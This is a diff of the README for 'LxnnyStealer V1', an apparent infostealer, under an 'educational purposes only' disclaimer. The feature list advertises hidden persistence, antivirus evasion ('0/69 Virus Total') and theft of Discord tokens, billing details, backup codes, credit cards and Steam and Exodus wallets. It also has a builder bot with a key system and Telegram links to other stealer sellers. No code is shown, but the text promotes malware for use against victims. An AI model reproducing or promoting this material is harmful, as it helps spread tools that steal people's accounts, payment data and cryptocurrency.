@@ -19,24 +19,30 @@
 <b>This Tool is made for educational purposes only</b>. Do not attempt to violate the law with anything contained here.!
 </i>
 
-# Features
-Percistance Hidden Startup.
-Discord Token Stealer.
-Good Obfuscator/Crypter.
-Discord Info - Username, Phone number, Email, Billing, Nitro Status & Backup Codes
-Discord Token, Friends with rare badges, Credit card
-Steam/Exodus Stealer.
-DualHook API.
-Builder Bot with Key System.
+### ⚔️ 〢 Features
 
-# Skidders.
-https://t.me/flamestealer
-https://t.me/awsxustealer
-https://t.me/celestialdev
+#### Stealer
+> Percistance Hidden Startup.
+> Discord Token Stealer.
+> Good Obfuscator/Crypter.
+> Discord Info - Username, Phone number, Email, Billing, Nitro Status & Backup Codes
+> Discord Token, Friends with rare badges, Credit card
+> Steam/Exodus Stealer.
+> DualHook API.
+> 0/69 Virus Total.
+> Builder Bot with Key System.
+> Get PC Info from Victim.
 
+#### Skidders. (DON'T BUY SHIT with DUALHOOK LOOL)
+> https://t.me/flamestealer
+> https://t.me/awsxustealer
+> https://t.me/celestialdev
 
-<h1>About bot</h1>
-<p><li>Author: nfo</li></p>
+### 📸 〢 Screenshots
+<img title="" src="[https://media.discordapp.net/attachments/994591063253733407/1218380347729772644/image.png?ex=66383b9f&is=6636ea1f&hm=06219c1455394a23e2d272c56de959c5bbd68834dbe68610c95ba58932ba8cc5&](https://media.discordapp.net/attachments/1236022708408553585/1238620498712199228/image.png?ex=663ff2bb&is=663ea13b&hm=eb573ebf86c4569c402a3f270ac8c4c03a5cca895128e3fa929aec916e9d0c0f&=&format=webp&quality=lossless&width=422&height=437)" alt="" width="750">
+
+<h1>About LxnnyStealer V1</h1>
+<p><li>Author: nfo & Fakie.</li></p>
 <p><li>Version: 1.0</li></p>
 <p><li>Language: Python and JavaScript</li></p>
 <p><li>Forks: NikkiStealer & FewerStealer. (Thanks for: Fewer and Sk4yx)</li></p>
